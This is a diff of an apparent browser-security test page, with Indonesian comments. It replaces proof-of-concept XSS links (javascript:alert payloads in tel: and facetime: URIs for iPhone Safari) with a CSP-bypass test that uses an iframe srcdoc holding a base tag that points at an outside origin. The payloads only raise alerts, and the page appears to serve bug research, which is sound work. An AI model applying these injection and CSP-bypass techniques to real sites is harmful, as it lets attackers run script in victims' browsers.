@@ -1,9 +1,20 @@
-<h2>Tel/Facetime Scheme Test - iPhone Only</h2>
-<a href="tel://1234567890;javascript:alert(1)">TEL + JS</a><br>
-<a href="facetime://contact?javascript:alert(document.domain)">FACETIME + JS</a><br>
-<a href="facetime-audio://123?x=1;javascript:alert(2)">FACETIME-AUDIO + JS</a>
-<pre>
-Tap 3 link di atas di Safari iPhone.
-Kalau ada alert 1/2/domain = URI scheme XSS = BUG
-Di Chrome: ga akan alert
-</pre>
+<!DOCTYPE html>
+<html>
+<head><meta http-equiv="Content-Security-Policy" content="script-src 'self'"></head>
+<body>
+<h2>Base + Srcdoc Bypass - Safari Only</h2>
+<pre id="log"></pre>
+<script>
+let log=m=>document.getElementById('log').textContent+=m+"\n";
+
+// Di Chrome: di-block CSP karena base tag ubah origin
+// Di Safari lama: lolos!
+let f=document.createElement('iframe');
+f.srcdoc=`<base href="https://0x403for.github.io/"><script>alert('Safari Bypass: '+document.domain)<\/script>`;
+document.body.appendChild(f);
+
+log("Kalau di Chrome: no alert (CSP block)");
+log("Kalau di Safari: alert muncul = BUG CSP BYPASS");
+</script>
+</body>
+</html>
